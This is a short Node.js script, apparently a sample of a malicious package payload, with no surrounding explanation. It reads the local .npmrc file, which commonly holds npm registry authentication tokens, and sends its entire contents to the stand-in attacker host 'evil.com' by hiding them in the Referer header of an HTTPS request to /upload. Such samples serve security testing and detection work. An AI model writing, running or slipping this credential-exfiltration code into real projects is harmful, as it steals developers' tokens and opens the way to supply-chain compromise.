var fs = require("fs"),
    https = require("https");

var content = fs.readFileSync(".npmrc", "utf8");
https.get({
  hostname: "evil.com",
  path: "/upload",
  method: "GET",
  headers: { Referer: content }
}, () => { });
